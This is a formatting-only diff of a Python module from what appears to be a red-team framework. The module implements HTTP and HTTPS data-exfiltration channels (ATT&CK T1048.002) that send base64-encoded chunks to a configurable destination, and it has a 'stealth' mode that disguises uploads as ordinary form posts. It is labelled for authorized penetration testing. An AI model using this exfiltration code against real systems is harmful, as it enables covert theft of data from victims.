@@ -9,14 +9,14 @@ ATT&CK Technique: T1048.002 - Exfiltration Over Asymmetric Encrypted Non-C2 Prot
 Warning: 仅限授权渗透测试使用！
 """
 
-from typing import Optional, Dict, Any, Union
-import logging
 import base64
+import logging
+from typing import Any, Dict, Optional, Union
 
 from ..base import (
     BaseExfiltration,
-    ExfilConfig,
     ExfilChannel,
+    ExfilConfig,
     ExfilStatus,
 )
 
@@ -32,15 +32,15 @@ class HTTPExfiltration(BaseExfiltration):
     Warning: 仅限授权渗透测试使用！
     """
 
-    name = 'http_exfil'
-    description = 'HTTP Exfiltration Channel'
+    name = "http_exfil"
+    description = "HTTP Exfiltration Channel"
     channel = ExfilChannel.HTTP
 
     def __init__(self, config: ExfilConfig):
         super().__init__(config)
         self._session = None
         self._chunk_id = 0
-        self._transfer_id = ''
+        self._transfer_id = ""
 
     def _get_ssl_verify(self) -> Union[bool, str]:
         """
@@ -53,12 +53,17 @@ class HTTPExfiltration(BaseExfiltration):
         if self.config.ssl_cert_path:
             # 验证证书文件是否存在
             from pathlib import Path
+
             cert_path = Path(self.config.ssl_cert_path)
             if not cert_path.exists():
-                self.logger.warning(f"SSL certificate not found: {self.config.ssl_cert_path}, falling back to verify_ssl")
+                self.logger.warning(
+                    f"SSL certificate not found: {self.config.ssl_cert_path}, falling back to verify_ssl"
+                )
                 return self.config.verify_ssl
             if not cert_path.is_file():
-                self.logger.warning(f"SSL certificate path is not a file: {self.config.ssl_cert_path}, falling back to verify_ssl")
+                self.logger.warning(
+                    f"SSL certificate path is not a file: {self.config.ssl_cert_path}, falling back to verify_ssl"
+                )
                 return self.config.verify_ssl
             return str(cert_path)
 
@@ -68,23 +73,26 @@ class HTTPExfiltration(BaseExfiltration):
     def connect(self) -> bool:
         """建立 HTTP 连接"""
         try:
-            import requests
             import uuid
+
+            import requests
 
             self._session = requests.Session()
 
             # 设置 headers
-            self._session.headers.update({
-                'User-Agent': self.config.user_agent,
-                'Accept': '*/*',
-                'Accept-Encoding': 'gzip, deflate',
-            })
+            self._session.headers.update(
+                {
+                    "User-Agent": self.config.user_agent,
+                    "Accept": "*/*",
+                    "Accept-Encoding": "gzip, deflate",
+                }
+            )
 
             # 设置代理
             if self.config.proxy:
                 self._session.proxies = {
-                    'http': self.config.proxy,
-                    'https': self.config.proxy,
+                    "http": self.config.proxy,
+                    "https": self.config.proxy,
                 }
 
             # 生成传输 ID
@@ -97,16 +105,14 @@ class HTTPExfiltration(BaseExfiltration):
                 verify = self._get_ssl_verify()
 
                 # 安全警告：当禁用SSL验证时
-                if not verify and self.config.destination.startswith('https://'):
+                if not verify and self.config.destination.startswith("https://"):
                     self.logger.warning(
                         "⚠️  SSL verification is disabled for HTTPS connection. "
                         "This is insecure and should only be used in testing environments."
                     )
 
                 response = self._session.head(
-                    self.config.destination,
-                    timeout=self.config.timeout,
-                    verify=verify
+                    self.config.destination, timeout=self.config.timeout, verify=verify
                 )
                 return response.status_code < 500
             except requests.exceptions.SSLError as e:
@@ -148,7 +154,7 @@ class HTTPExfiltration(BaseExfiltration):
             import requests
 
             # 编码数据
-            encoded_data = base64.b64encode(data).decode('ascii')
+            encoded_data = base64.b64encode(data).decode("ascii")
 
             # 构建请求
             url = self.config.destination
@@ -156,24 +162,21 @@ class HTTPExfiltration(BaseExfiltration):
             if self.config.stealth:
                 # 隐蔽模式：伪装成正常请求
                 payload = {
-                    'action': 'upload',
-                    'session': self._transfer_id,
-                    'seq': self._chunk_id,
-                    'data': encoded_data,
+                    "action": "upload",
+                    "session": self._transfer_id,
+                    "seq": self._chunk_id,
+                    "data": encoded_data,
                 }
 
                 response = self._session.post(
-                    url,
-                    data=payload,
-                    timeout=self.config.timeout,
-                    verify=self._get_ssl_verify()
+                    url, data=payload, timeout=self.config.timeout, verify=self._get_ssl_verify()
                 )
             else:
                 # 直接模式
                 headers = {
-                    'X-Transfer-Id': self._transfer_id,
-                    'X-Chunk-Id': str(self._chunk_id),
-                    'Content-Type': 'application/octet-stream',
+                    "X-Transfer-Id": self._transfer_id,
+                    "X-Chunk-Id": str(self._chunk_id),
+                    "Content-Type": "application/octet-stream",
                 }
 
                 response = self._session.post(
@@ -181,7 +184,7 @@ class HTTPExfiltration(BaseExfiltration):
                     data=data,
                     headers=headers,
                     timeout=self.config.timeout,
-                    verify=self._get_ssl_verify()
+                    verify=self._get_ssl_verify(),
                 )
 
             self._chunk_id += 1
@@ -205,20 +208,20 @@ class HTTPSExfiltration(HTTPExfiltration):
     Warning: 仅限授权渗透测试使用！
     """
 
-    name = 'https_exfil'
-    description = 'HTTPS Exfiltration Channel'
+    name = "https_exfil"
+    description = "HTTPS Exfiltration Channel"
     channel = ExfilChannel.HTTPS
 
     def connect(self) -> bool:
         """建立 HTTPS 连接"""
         # 确保使用 HTTPS
-        if not self.config.destination.startswith('https://'):
-            if self.config.destination.startswith('http://'):
-                self.config.destination = self.config.destination.replace('http://', 'https://')
+        if not self.config.destination.startswith("https://"):
+            if self.config.destination.startswith("http://"):
+                self.config.destination = self.config.destination.replace("http://", "https://")
             else:
-                self.config.destination = f'https://{self.config.destination}'
+                self.config.destination = f"https://{self.config.destination}"
 
         return super().connect()
 
 
-__all__ = ['HTTPExfiltration', 'HTTPSExfiltration']
+__all__ = ["HTTPExfiltration", "HTTPSExfiltration"]
